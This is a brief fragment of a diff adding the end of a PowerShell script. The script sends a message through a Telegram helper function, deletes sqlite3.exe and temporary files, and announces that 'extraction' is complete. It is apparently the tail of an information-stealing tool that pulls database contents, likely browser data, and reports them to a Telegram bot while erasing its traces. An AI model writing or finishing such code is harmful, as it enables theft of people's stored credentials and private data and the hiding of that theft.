+    Send-TelegramMessage -Message $emptyMsg | Out-Null
+}
+
+# Cleanup
+if (Test-Path "sqlite3.exe") { Remove-Item "sqlite3.exe" -Force }
+Get-ChildItem -Path "." -Filter "temp_*" | Remove-Item -Force
+
+Write-Host "`n✅ Extraction completed at $(Get-Date -Format 'HH:mm:ss')" -ForegroundColor Green
